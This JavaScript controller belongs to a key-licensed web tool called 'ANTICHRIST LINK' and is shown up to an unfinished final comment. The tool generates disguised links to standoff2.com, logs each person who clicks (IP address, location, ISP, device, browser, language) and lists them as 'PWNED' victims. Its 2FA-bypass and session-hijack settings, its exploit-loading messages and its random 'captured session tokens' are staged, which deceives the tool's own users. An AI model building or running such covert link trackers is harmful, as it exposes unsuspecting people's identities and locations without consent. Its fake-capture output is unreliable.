/* ============================================================
   ANTICHRIST LINK — Main Application Controller
   app.js — Navigation, state management, PWA init
   ============================================================ */

window.AC = window.AC || {};

(function () {
  'use strict';

  // ── State ──────────────────────────────────────────────────
  const state = {
    activated: false,
    currentScreen: 'activation',
    selectedTarget: 'standoff2',
    selectedLinkType: 'browser-promo',
    userRole: null,
    userNickname: null,
    userKey: null,
    config: {
      bypass2fa: true,
      stealth: true,
      fingerprint: true,
      passwords: true,
      sessionHijack: true,
      proxy: 'RU-7'
    },
    linksRemaining: 7,
    linksTotal: 10,
    victims: [],
    activeLinks: [],
    generatedUrl: null,
    generatedToken: null,
    generatedVictimData: null,
    cancelFunctions: []
  };

  // ── Screens ────────────────────────────────────────────────
  const screens = [
    'activation', 'splash', 'dashboard',
    'generating', 'result', 'victims', 'mylinks', 'admin', 'about'
  ];

  function getScreen(name) {
    return document.getElementById('screen-' + name);
  }

  function showScreen(name) {
    const from = getScreen(state.currentScreen);
    const to = getScreen(name);
    if (!from || !to || name === state.currentScreen) return;

    // Cancel any running animations from previous screen
    cancelAll();

    if (window.AC.anim && window.AC.anim.screenTransition) {
      window.AC.anim.screenTransition(from, to, function () {
        state.currentScreen = name;
        onScreenEnter(name);
      });
    } else {
      from.classList.remove('active');
      to.classList.add('active');
      state.currentScreen = name;
      onScreenEnter(name);
    }

    // Update nav
    updateNav(name);
  }

  function updateNav(name) {
    var navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(function (item) {
      item.classList.toggle('active', item.dataset.screen === name);
    });
    // Show admin tab only for admin role
    var adminNav = document.getElementById('nav-item-admin');
    if (adminNav) {
      adminNav.style.display = (state.userRole === 'admin') ? 'flex' : 'none';
    }
    // Show/hide nav
    var nav = document.getElementById('main-nav');
    if (nav) {
      var showNav = ['dashboard', 'victims', 'about', 'mylinks', 'admin'].indexOf(name) !== -1;
      nav.classList.toggle('visible', showNav);
    }
  }

  function cancelAll() {
    state.cancelFunctions.forEach(function (fn) {
      if (typeof fn === 'function') fn();
    });
    state.cancelFunctions = [];
  }

  // ── Screen Enter Handlers ─────────────────────────────────
  function onScreenEnter(name) {
    switch (name) {
      case 'dashboard':
        startDashboard();
        break;
      case 'generating':
        startGeneration();
        break;
      case 'result':
        showResult();
        break;
      case 'victims':
        showVictims();
        break;
      case 'mylinks':
        showMyLinks();
        break;
      case 'admin':
        showAdmin();
        break;
      case 'about':
        break;
    }
  }

  // ── Activation Screen ─────────────────────────────────────
  function initActivation() {
    var keyInput = document.getElementById('activation-key');
    var activateBtn = document.getElementById('btn-activate');
    var errorEl = document.getElementById('activation-error');

    if (!activateBtn) return;

    activateBtn.addEventListener('click', function () {
      var key = keyInput ? keyInput.value.trim() : '';
      if (!key) {
        if (errorEl) { errorEl.textContent = '✗ Enter activation key'; errorEl.style.display = 'block'; }
        return;
      }

      activateBtn.textContent = 'CHECKING...';
      activateBtn.disabled = true;

      fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: key })
      })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (!data.success) {
          if (errorEl) { errorEl.textContent = '✗ INVALID KEY'; errorEl.style.display = 'block'; }
          activateBtn.textContent = 'ACTIVATE'; activateBtn.disabled = false;
          if (window.AC.anim) window.AC.anim.glitch(keyInput, 500);
          return;
        }

        if (errorEl) errorEl.style.display = 'none';

        if (data.role === 'admin') {
          // Admin — straight in
          state.userRole = 'admin';
          state.userNickname = 'ADMIN';
          state.userKey = key;
          localStorage.setItem('ac_key', key);
          localStorage.setItem('ac_role', 'admin');
          localStorage.setItem('ac_nick', 'ADMIN');
          state.activated = true;
          showScreen('splash');
          startSplash();
          return;
        }

        if (data.needsNickname) {
          // First-time user — ask for nickname
          showNicknameInput(key);
        } else {
          // Returning user
          state.userRole = 'user';
          state.userNickname = data.nickname;
          state.userKey = key;
          localStorage.setItem('ac_key', key);
          localStorage.setItem('ac_role', 'user');
          localStorage.setItem('ac_nick', data.nickname);
          state.activated = true;
          showScreen('splash');
          startSplash();
        }
      })
      .catch(function() {
        if (errorEl) { errorEl.textContent = '✗ SERVER ERROR'; errorEl.style.display = 'block'; }
        activateBtn.textContent = 'ACTIVATE'; activateBtn.disabled = false;
      });
    });

    if (keyInput) {
      keyInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') activateBtn.click();
      });
    }
  }

  function showNicknameInput(key) {
    var container = document.querySelector('.activation-container');
    if (!container) return;

    container.innerHTML =
      '<h2 class="activation-title" style="margin-bottom:0.5rem">ENTER YOUR NICKNAME</h2>' +
      '<p style="color:var(--text-dim);font-size:0.75rem;margin-bottom:1.5rem;font-family:var(--font-mono)">Key accepted. Set your callsign.</p>' +
      '<input type="text" id="nickname-input" class="input-field mono" placeholder="Your nickname..." maxlength="20" autocomplete="off" spellcheck="false" style="margin-bottom:1rem;text-align:center">' +
      '<div id="nickname-error" style="display:none;color:var(--danger);font-size:0.75rem;margin-bottom:0.5rem"></div>' +
      '<button class="btn-activate" id="btn-set-nick">CONFIRM</button>';

    var nickInput = document.getElementById('nickname-input');
    var nickBtn = document.getElementById('btn-set-nick');
    var nickErr = document.getElementById('nickname-error');

    nickBtn.addEventListener('click', function () {
      var nick = nickInput.value.trim();
      if (!nick || nick.length < 2) {
        nickErr.textContent = '✗ Minimum 2 characters';
        nickErr.style.display = 'block';
        return;
      }

      nickBtn.textContent = 'REGISTERING...';
      nickBtn.disabled = true;

      fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: key, nickname: nick })
      })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (!data.success) {
          nickErr.textContent = '✗ ' + (data.error || 'Registration failed');
          nickErr.style.display = 'block';
          nickBtn.textContent = 'CONFIRM'; nickBtn.disabled = false;
          return;
        }
        state.userRole = data.role;
        state.userNickname = data.nickname;
        state.userKey = key;
        localStorage.setItem('ac_key', key);
        localStorage.setItem('ac_role', data.role);
        localStorage.setItem('ac_nick', data.nickname);
        state.activated = true;
        showScreen('splash');
        startSplash();
      });
    });

    nickInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') nickBtn.click(); });
    nickInput.focus();
  }

  // ── Splash Screen ─────────────────────────────────────────
  function startSplash() {
    var steps = [
      { el: 'splash-step-1', text: 'Connecting to ANTICHRIST network...', duration: 800 },
      { el: 'splash-step-2', text: 'Verifying license key...', duration: 600 },
      { el: 'splash-step-3', text: 'Loading exploit modules...', duration: 1000 },
      { el: 'splash-step-4', text: 'Checking for updates... v3.1.7 is latest', duration: 500 },
      { el: 'splash-step-5', text: 'Access granted. Welcome back.', duration: 400 }
    ];

    var delay = 0;
    steps.forEach(function (step, i) {
      delay += step.duration;
      setTimeout(function () {
        var el = document.getElementById(step.el);
        if (el) {
          el.querySelector('.splash-text').textContent = step.text;
          el.querySelector('.splash-bar-fill').style.width = '100%';
          el.classList.add('complete');
        }
        if (i === steps.length - 1) {
          setTimeout(function () {
            showScreen('dashboard');
          }, 800);
        }
      }, delay);
    });
  }

  // ── Theme Engine ──────────────────────────────────────────
  function initTheme() {
    var savedTheme = localStorage.getItem('ac_theme') || 'ghost';
    applyTheme(savedTheme);

    document.querySelectorAll('.theme-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var t = btn.dataset.setTheme;
        if (t) applyTheme(t);
      });
    });
  }

  function applyTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    localStorage.setItem('ac_theme', theme);

    var titleEl = document.getElementById('header-console-title');
    var iconEl = document.getElementById('header-logo-icon');
    if (titleEl) {
      titleEl.textContent = (theme === 'neon') ? 'NEON // CONSOLE' : 'GHOST // CONSOLE';
    }
    if (iconEl) {
      iconEl.textContent = (theme === 'neon') ? '🔮' : '⚡';
    }

    document.querySelectorAll('.theme-btn').forEach(function (b) {
      var isCur = b.dataset.setTheme === theme;
      if (theme === 'ghost') {
        b.style.background = isCur ? '#1a1d26' : '#12141a';
        b.style.borderColor = isCur ? '#38bdf8' : '#242835';
        b.style.color = isCur ? '#fff' : '#64748b';
      } else {
        b.style.background = isCur ? '#1a0e30' : '#100b1a';
        b.style.borderColor = isCur ? '#c026d3' : '#3b1d5c';
        b.style.color = isCur ? '#fff' : '#8b5cf6';
      }
    });
  }

  // ── Dashboard ─────────────────────────────────────────────
  function startDashboard() {
    // Update user badge in header
    var userNickEl = document.getElementById('header-user-nick');
    var isAdmin = (state.userRole === 'admin' || state.userKey === 'ANTICHRIST-GOD-MODE' || localStorage.getItem('ac_key') === 'ANTICHRIST-GOD-MODE');

    if (userNickEl) {
      userNickEl.textContent = isAdmin ? '⚡ ROOT // LO' : ('OPERATOR // ' + (state.userNickname || 'ANON'));
    }

    // Direct God-Mode button in header
    var godModeBtn = document.getElementById('btn-admin-godmode');
    if (godModeBtn) {
      godModeBtn.style.display = isAdmin ? 'inline-block' : 'none';
      godModeBtn.onclick = function () {
        showScreen('admin');
      };
    }

    // Ensure Admin tab in nav is displayed if admin
    var adminNav = document.getElementById('nav-item-admin');
    if (adminNav) {
      adminNav.style.display = isAdmin ? 'flex' : 'none';
    }

    // Start log ticker
    var tickerEl = document.getElementById('log-ticker');
    if (tickerEl && window.AC.anim) {
      var cancel = window.AC.anim.logTicker(tickerEl);
      state.cancelFunctions.push(cancel);
    }
  }

  function initDashboard() {
    initTheme();

    // Link type selection cards
    var typeCards = document.querySelectorAll('.link-type-card');
    typeCards.forEach(function (card) {
      card.addEventListener('click', function () {
        typeCards.forEach(function (c) {
          c.classList.remove('selected');
          c.style.borderColor = 'var(--border-color)';
          c.style.boxShadow = 'none';
          c.style.background = 'var(--bg-secondary)';
          var nameEl = c.querySelector('div[style*="font-weight:700"]');
          if (nameEl) nameEl.style.color = 'var(--text-secondary)';
        });
        card.classList.add('selected');
        card.style.borderColor = 'var(--accent-primary)';
        card.style.boxShadow = '0 0 12px var(--accent-primary-glow)';
        card.style.background = 'var(--bg-card)';
        var curNameEl = card.querySelector('div[style*="font-weight:700"]');
        if (curNameEl) curNameEl.style.color = '#fff';
        state.selectedLinkType = card.dataset.type;
      });
    });

    // Proxy selector
    var proxySelect = document.getElementById('proxy-select');
    if (proxySelect) {
      proxySelect.addEventListener('change', function () {
        state.config.proxy = proxySelect.value;
      });
    }

    // Generate button
    var generateBtn = document.getElementById('btn-generate');
    if (generateBtn) {
      generateBtn.addEventListener('click', function () {
        if (!state.selectedTarget) {
          if (window.AC.notify) {
            window.AC.notify.show('Select a target platform first', 'alert');
          }
          return;
        }
        var targetInput = document.getElementById('target-input');
        if (!targetInput || !targetInput.value.trim()) {
          if (window.AC.notify) {
            window.AC.notify.show('Enter target URL or username', 'alert');
          }
          return;
        }
        showScreen('generating');
      });
    }

    // Logout / Switch key button
    var logoutBtn = document.getElementById('btn-logout');
    if (logoutBtn) {
      logoutBtn.addEventListener('click', function () {
        if (confirm('Сменить ключ / выйти на экран активации?')) {
          localStorage.removeItem('ac_key');
          localStorage.removeItem('ac_role');
          localStorage.removeItem('ac_nick');
          localStorage.removeItem('ac_activated');
          location.reload();
        }
      });
    }

    // Nav items
    document.querySelectorAll('.nav-item').forEach(function (item) {
      item.addEventListener('click', function () {
        var screen = item.dataset.screen;
        if (screen) showScreen(screen);
      });
    });
  }

  // ── Generation Animation ──────────────────────────────────
  function startGeneration() {
    var terminalEl = document.getElementById('terminal-output');
    var progressContainer = document.getElementById('progress-container');
    var ipScannerEl = document.getElementById('ip-scanner');
    var canvasEl = document.getElementById('network-canvas');

    if (!window.AC.gen || !window.AC.terminal) return;

    // Clear previous
    if (terminalEl) terminalEl.innerHTML = '';
    if (ipScannerEl) ipScannerEl.innerHTML = '';

    // Snappy tactical terminal sequence (~1.5s)
    var lines = [
      { text: '[*] Engaging tactical payload engine...', delay: 100, type: 'info' },
      { text: '[+] Binding proxy node & SSL cert...', delay: 150, type: 'info' },
      { text: '[+] Initializing target fingerprint listener...', delay: 200, type: 'info' },
      { text: '[✓] SUCCESS: Payload armed and ready.', delay: 150, type: 'success' }
    ];
    var cancelTerminal = window.AC.terminal.start(terminalEl, lines, function () {
      setTimeout(function () {
        // Call backend to create real tracking link
        fetch('/api/create-link', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            destination: 'https://standoff2.com',
            linkType: state.selectedLinkType || 'browser-promo',
            nickname: state.userNickname || 'Anonymous'
          })
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
          console.log('[AC] Tracker response:', data);
          if (data.success && data.url) {
            state.generatedUrl = data.url;
            state.currentLoggerId = data.logger_id;
          } else {
            state.generatedUrl = window.AC.gen.fakeUrl(state.selectedTarget);
            state.currentLoggerId = null;
            console.warn('[AC] API failed, using fallback');
          }
          state.linksRemaining = Math.max(0, state.linksRemaining - 1);
          showScreen('result');
        })
        .catch(function(err) {
          console.error('[AC] API error, falling back to fake:', err);
          state.generatedUrl = window.AC.gen.fakeUrl(state.selectedTarget);
          state.currentLoggerId = null;
          state.linksRemaining = Math.max(0, state.linksRemaining - 1);
          showScreen('result');
        });
      }, 1200);
    });
    state.cancelFunctions.push(cancelTerminal);

    // Start progress bars
    if (window.AC.anim && progressContainer) {
      window.AC.anim.progressBars(progressContainer, 12000);
    }

    // Start IP scanner
    if (window.AC.anim && ipScannerEl) {
      var cancelIp = window.AC.anim.ipScanner(ipScannerEl);
      state.cancelFunctions.push(cancelIp);
    }

    // Start network canvas
    if (window.AC.anim && canvasEl) {
      var cancelCanvas = window.AC.anim.networkCanvas(canvasEl);
      state.cancelFunctions.push(cancelCanvas);
    }
  }

  // ── Result Screen ─────────────────────────────────────────
  function generateToken() {
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var token = '';
    for (var i = 0; i < 40; i++) {
      token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
  }

  function showResult() {
    var urlEl = document.getElementById('generated-url');

    if (urlEl && state.generatedUrl) {
      urlEl.textContent = state.generatedUrl;
    }

    // Save to active links — with real logger ID for fetching visitors
    var now = new Date();
    var timeStr = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
    var dateStr = String(now.getDate()).padStart(2,'0') + '.' + String(now.getMonth()+1).padStart(2,'0') + '.' + now.getFullYear();
    var linkEntry = {
      url: state.generatedUrl,
      loggerId: state.currentLoggerId,
      token: null,
      date: dateStr + ' ' + timeStr,
      status: 'waiting',
      clicks: 0
    };
    state.activeLinks.unshift(linkEntry);

    // Victims will ONLY appear when someone clicks the link in real life!
    // Periodic check for new real visitors
    if (state.currentLoggerId) {
      var checkInterval = setInterval(function() {
        fetch('/api/visitors/' + state.currentLoggerId)
          .then(function(r) { return r.json(); })
          .then(function(data) {
            if (data.visitors && data.visitors.length > 0) {
              linkEntry.status = 'captured';
              linkEntry.clicks = data.visitors.length;
              if (!linkEntry.token) linkEntry.token = generateToken();
              if (window.AC.notify) {
                window.AC.notify.show('Session captured! Target opened link. Check Intercept logs.', 'info');
              }
              clearInterval(checkInterval);
            }
          })
          .catch(function() {});
      }, 5000);
      state.cancelFunctions.push(function() { clearInterval(checkInterval); });
    }

    // Copy button
    var copyBtn = document.getElementById('btn-copy-link');
    if (copyBtn) {
      copyBtn.onclick = function () {
        if (state.generatedUrl) {
          navigator.clipboard.writeText(state.generatedUrl).then(function () {
            if (window.AC.notify) {
              window.AC.notify.show('Link copied to clipboard', 'success');
            }
            copyBtn.textContent = '✓ COPIED';
            setTimeout(function () { copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>COPY LINK'; }, 2000);
          });
        }
      };
    }

    // My Links button
    var myLinksBtn = document.getElementById('btn-my-links');
    if (myLinksBtn) {
      myLinksBtn.onclick = function () {
        showScreen('mylinks');
      };
    }

    // Back to profile
    var backBtn = document.getElementById('btn-back-profile');
    if (backBtn) {
      backBtn.onclick = function () {
        showScreen('dashboard');
      };
    }

    // New target button
    var newBtn = document.getElementById('btn-new-target');
    if (newBtn) {
      newBtn.onclick = function () {
        showScreen('dashboard');
      };
    }
  }

  // ── My Links Screen ─────────────────────────────────────────
  function showMyLinks() {
    var listEl = document.getElementById('mylinks-list');
    var countEl = document.getElementById('mylinks-count');
    if (!listEl) return;

    if (countEl) countEl.textContent = state.activeLinks.length;

    if (state.activeLinks.length === 0) {
      listEl.innerHTML = '<div class="mylinks-empty mono text-dim">No active links. Generate one first.</div>';
      return;
    }

    var html = '';
    state.activeLinks.forEach(function (link, i) {
      var isCaptured = link.status === 'captured' && link.token;
      var statusClass = isCaptured ? 'status-active' : 'status-waiting';
      var statusText = isCaptured ? 'CAPTURED' : 'WAITING';

      var tokenHtml = '';
      if (isCaptured) {
        tokenHtml = '<div class="mylink-token-row">' +
          '<span class="input-label" style="margin:0;font-size:0.6rem">SESSION TOKEN</span>' +
          '<div class="mylink-token mono">' + link.token + '</div>' +
        '</div>';
      } else {
        tokenHtml = '<div class="mylink-token-row">' +
          '<span class="text-dim mono" style="font-size:0.65rem">Waiting for target to open link...</span>' +
        '</div>';
      }

      html += '<div class="mylink-card' + (isCaptured ? ' mylink-captured' : '') + '">' +
        '<div class="mylink-header">' +
          '<span class="mylink-status ' + statusClass + '">' + statusText + '</span>' +
          '<span class="mylink-date mono text-dim">' + link.date + '</span>' +
        '</div>' +
        '<div class="mylink-url mono">' + link.url + '</div>' +
        tokenHtml +
        '<div class="mylink-footer">' +
          '<span class="mylink-clicks"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:3px"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>' + link.clicks + ' clicks</span>' +
          '<span class="mylink-copy-small" data-url="' + link.url + '">copy</span>' +
        '</div>' +
      '</div>';
    });

    listEl.innerHTML = html;

    // Bind copy buttons
    listEl.querySelectorAll('.mylink-copy-small').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var url = btn.dataset.url;
        navigator.clipboard.writeText(url).then(function() {
          btn.textContent = 'copied!';
          setTimeout(function() { btn.textContent = 'copy'; }, 1500);
        });
      });
    });
  }

  // ── Victims Panel ─────────────────────────────────────────
  function showVictims() {
    var tableEl = document.getElementById('victims-table');
    var tableBody = document.getElementById('victims-table-body');
    var emptyMsg = document.getElementById('victims-empty-state');
    var vLinks = document.getElementById('vmetric-links');
    var vClicks = document.getElementById('vmetric-clicks');
    var vCap = document.getElementById('vmetric-captured');

    if (vLinks) vLinks.textContent = state.activeLinks.length;

    // Collect all logger IDs to fetch
    var loggerIds = state.activeLinks
      .filter(function(l) { return l.loggerId; })
      .map(function(l) { return l.loggerId; });

    if (loggerIds.length === 0) {
      // No real loggers — show empty or local data
      renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap);
      return;
    }

    // Fetch real visitors for each logger
    var promises = loggerIds.map(function(lid) {
      return fetch('/api/visitors/' + lid)
        .then(function(r) { return r.json(); })
        .catch(function() { return { visitors: [] }; });
    });

    Promise.all(promises).then(function(results) {
      var realVisitors = [];
      results.forEach(function(data) {
        var visitors = data.visitors || [];
        if (Array.isArray(visitors)) {
          visitors.forEach(function(v) {
            realVisitors.push({
              ip: v.ip || 'unknown',
              city: v.city || '',
              country: v.country || '',
              region: v.region || '',
              device: v.device || 'unknown',
              browser: v.browser || '',
              os: v.os || '',
              isp: v.isp || '',
              userAgent: v.userAgent || '',
              language: v.language || '',
              status: 'pwned',
              timestamp: v.timestamp || ''
            });
          });
        }
      });

      // Merge with existing state victims (avoid duplicates by IP)
      var existingIps = {};
      state.victims.forEach(function(v) { existingIps[v.ip] = true; });
      realVisitors.forEach(function(rv) {
        if (!existingIps[rv.ip]) {
          state.victims.unshift(rv);
          existingIps[rv.ip] = true;
        }
      });

      renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap);
    });
  }

  // ── Victims Screen & Cards List ───────────────────────────
  function renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap) {
    var totalCaptured = state.victims.length;
    if (vClicks) vClicks.textContent = totalCaptured;
    if (vCap) vCap.textContent = totalCaptured;

    var cardsList = document.getElementById('victims-cards-list');

    if (state.victims.length === 0) {
      if (cardsList) cardsList.style.display = 'none';
      if (tableEl) tableEl.style.display = 'none';
      if (emptyMsg) emptyMsg.style.display = 'block';
      return;
    }

    if (emptyMsg) emptyMsg.style.display = 'none';

    // Render modern mobile tactical cards
    if (cardsList) {
      cardsList.style.display = 'flex';
      cardsList.innerHTML = '';

      state.victims.forEach(function (v) {
        var card = document.createElement('div');
        card.style.cssText = 'background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:8px;padding:0.75rem 1rem;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all 0.2s;';
        card.onmouseover = function() { card.style.borderColor = 'var(--accent-primary)'; };
        card.onmouseout = function() { card.style.borderColor = 'var(--border-color)'; };

        var isMobile = /iPhone|iPad|Android|Mobile/i.test(v.device || v.userAgent);
        var devIcon = isMobile ? '📱' : '💻';
        var loc = [v.city, v.country].filter(Boolean).join(', ') || 'Unknown Geo';
        var time = v.timestamp ? new Date(v.timestamp).toLocaleTimeString() : '';

        card.innerHTML =
          '<div>' +
            '<div style="display:flex;align-items:center;gap:0.4rem;margin-bottom:0.25rem;">' +
              '<span style="font-size:1rem;">' + devIcon + '</span>' +
              '<span class="mono" style="font-weight:bold;color:var(--accent-primary);font-size:0.85rem;">' + (v.ip || 'unknown') + '</span>' +
            '</div>' +
            '<div style="font-size:0.7rem;color:var(--text-dim);font-family:var(--font-mono);">' + loc + ' · ' + (v.device || 'Device') + ' · ' + time + '</div>' +
          '</div>' +
          '<div>' +
            '<span style="background:var(--accent-primary-glow);color:var(--accent-primary);border:1px solid var(--accent-primary);padding:0.25rem 0.5rem;border-radius:4px;font-size:0.65rem;font-family:var(--font-mono);font-weight:bold;">PWNED</span>' +
          '</div>';

        card.addEventListener('click', function () { showVictimDetail(v); });
        cardsList.appendChild(card);
      });
    }

    // Also populate table as fallback
    if (tableBody) {
      tableBody.innerHTML = '';
      state.victims.forEach(function (victim, i) {
        var row = document.createElement('tr');
        row.className = 'victim-row';
        row.innerHTML =
          '<td>' + (i + 1) + '</td>' +
          '<td class="mono"><span class="text-red">' + (victim.ip || 'unknown') + '</span></td>' +
          '<td class="mono">' + (victim.city || victim.country || 'unknown') + '</td>' +
          '<td style="font-size:0.7rem">' + (victim.device || 'unknown') + '</td>' +
          '<td><span class="badge status-pwned">LOGGED</span></td>';
        row.addEventListener('click', function () { showVictimDetail(victim); });
        tableBody.appendChild(row);
      });
    }
  }

  function showVictimDetail(victim) {
    var modal = document.getElementById('victim-modal');
    var modalContent = document.getElementById('victim-modal-content');
    if (!modal || !modalContent) return;

    var location = [victim.city, victim.region, victim.country].filter(Boolean).join(', ') || 'Unknown';
    var time = victim.timestamp ? new Date(victim.timestamp).toLocaleString() : 'N/A';

    modalContent.innerHTML =
      '<h3 class="modal-title">&#10013; VISITOR DATA</h3>' +
      '<div class="data-row"><span class="data-label">IP Address:</span><span class="data-value text-red mono">' + (victim.ip || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Location:</span><span class="data-value">' + location + '</span></div>' +
      '<div class="data-row"><span class="data-label">ISP:</span><span class="data-value">' + (victim.isp || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Device:</span><span class="data-value">' + (victim.device || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">OS:</span><span class="data-value">' + (victim.os || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Browser:</span><span class="data-value">' + (victim.browser || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Language:</span><span class="data-value">' + (victim.language || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Timestamp:</span><span class="data-value mono">' + time + '</span></div>' +
      '<div class="data-row" style="margin-top:0.8rem;padding-top:0.8rem;border-top:1px solid var(--border-color)"><span class="data-label">User-Agent:</span></div>' +
      '<div style="font-size:0.55rem;color:var(--text-dim);word-break:break-all;line-height:1.5;padding:0.4rem 0" class="mono">' + (victim.userAgent || 'N/A') + '</div>';

    modal.classList.add('visible');

    modal.onclick = function (e) {
      if (e.target === modal) {
        modal.classList.remove('visible');
      }
    };
  }

  // ── Admin Screen ──────────────────────────────────────────
  function showAdmin() {
    var adminKey = state.userKey || localStorage.getItem('ac_key');
    if (state.userRole !== 'admin' && adminKey !== 'ANTICHRIST-GOD-MODE') {
      showScreen('dashboard');
      return;
    }

    // Load users
    fetch('/api/admin/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ adminKey: adminKey })
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      var tbody = document.getElementById('admin-users-body');
      if (!tbody) return;
      tbody.innerHTML = '';

      if (!data.users || data.users.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);">No users registered yet.</td></tr>';
        return;
      }

      data.users.forEach(function(u) {
        var tr = document.createElement('tr');
        var time = u.lastSeen ? new Date(u.lastSeen).toLocaleTimeString() : 'N/A';
        tr.innerHTML =
          '<td class="mono font-bold" style="color:var(--accent-red);">' + u.nickname + '</td>' +
          '<td class="mono" style="font-size:0.65rem;">' + u.key + '</td>' +
          '<td>' + (u.linksCreated || 0) + '</td>' +
          '<td class="text-green">' + (u.totalClicks || 0) + '</td>' +
          '<td style="font-size:0.65rem;">' + time + '</td>' +
          '<td><button class="btn-primary btn-rename" data-nick="' + u.nickname + '" style="padding:0.2rem 0.5rem;font-size:0.65rem;">RENAME</button></td>';

        tr.querySelector('.btn-rename').addEventListener('click', function() {
          var newNick = prompt('New nickname for ' + u.nickname + ':', u.nickname);
          if (newNick && newNick !== u.nickname) {
            fetch('/api/admin/rename', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ adminKey: adminKey, oldNickname: u.nickname, newNickname: newNick })
            })
            .then(function(res) { return res.json(); })
            .then(function(res) {
              if (res.success) {
                if (window.AC.notify) window.AC.notify.show('Renamed to ' + newNick, 'success');
                showAdmin();
              }
            });
          }
        });

        tbody.appendChild(tr);
      });
    });

    // Load keys
    loadAdminKeys(adminKey);

    // Gen keys button
    var genBtn = document.getElementById('btn-admin-genkeys');
    if (genBtn) {
      genBtn.onclick = function() {
        genBtn.disabled = true;
        fetch('/api/admin/generate-keys', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ adminKey: adminKey, count: 10 })
        })
        .then(function(r) { return r.json(); })
        .then(function(d) {
          genBtn.disabled = false;
          if (d.success) {
            if (window.AC.notify) window.AC.notify.show('+10 keys generated', 'success');
            loadAdminKeys(adminKey);
          }
        });
      };
    }
  }

  function loadAdminKeys(adminKey) {
    fetch('/api/admin/keys', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ adminKey: adminKey })
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      var keysEl = document.getElementById('admin-keys-list');
      if (!keysEl || !data.keys) return;

      var entries = Object.entries(data.keys);
      var unusedCount = entries.filter(function(e) { return !e[1].used; }).length;
      var usedCount = entries.length - unusedCount;

      var html = '<div style="margin-bottom:0.5rem;color:var(--text-dim);font-size:0.65rem;">' +
        'Total: <span class="text-red">' + entries.length + '</span> | Unused: <span class="text-green">' + unusedCount + '</span> | Used: <span class="text-yellow">' + usedCount + '</span>' +
        '</div><div style="display:flex;flex-wrap:wrap;gap:0.4rem;">';

      entries.forEach(function(item) {
        var k = item[0];
        var info = item[1];
        if (info.used) {
          html += '<span style="background:#221111;color:#666;padding:0.2rem 0.4rem;border-radius:3px;text-decoration:line-through;" title="Used by ' + (info.usedBy || 'someone') + '">' + k + '</span>';
        } else {
          html += '<span style="background:#112211;color:#00ff41;padding:0.2rem 0.4rem;border-radius:3px;cursor:pointer;" class="key-item" title="Click to copy">' + k + '</span>';
        }
      });
      html += '</div>';
      keysEl.innerHTML = html;

      // Copy on click
      keysEl.querySelectorAll('.key-item').forEach(function(el) {
        el.addEventListener('click', function() {
          navigator.clipboard.writeText(el.textContent);
          if (window.AC.notify) window.AC.notify.show('Copied ' + el.textContent, 'success');
        });
      });
    });
  }

  // ── PWA Registration ──────────────────────────────────────
  function registerPWA() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').catch(function () {
        // silent fail
      });
    }
  }

  // ── Init ──────────────────────────────────────────────────
  function init() {
    registerPWA();

    // Check if already authenticated
    var savedKey = localStorage.getItem('ac_key');
    var savedRole = localStorage.getItem('ac_role');
    var savedNick = localStorage.getItem('ac_nick');

    if (savedKey) {
      state.userKey = savedKey;
      state.userRole = savedRole || 'user';
      state.userNickname = savedNick || 'Anonymous';
      state.activated = true;

      var activationScreen = getScreen('activation');
      if (activationScreen) activationScreen.classList.remove('active');
      var dashboardScreen = getScreen('dashboard');
      if (dashboardScreen) dashboardScreen.classList.add('active');
      state.currentScreen = 'dashboard';
      updateNav('dashboard');
      onScreenEnter('dashboard');
    }

    initActivation();
    initDashboard();

    // Victims list starts completely empty until real link is clicked
    state.victims = [];

    // Version display
    var versionEls = document.querySelectorAll('.version-tag');
    versionEls.forEach(function (el) {
      el.textContent = 'v3.1.7';
    });
  }

  // ── Expose ────────────────────────────────────────────────
  window.AC.app = {
    showScreen: showScreen,
    state: state,
    init: init
  };

  // Auto-init on DOM ready
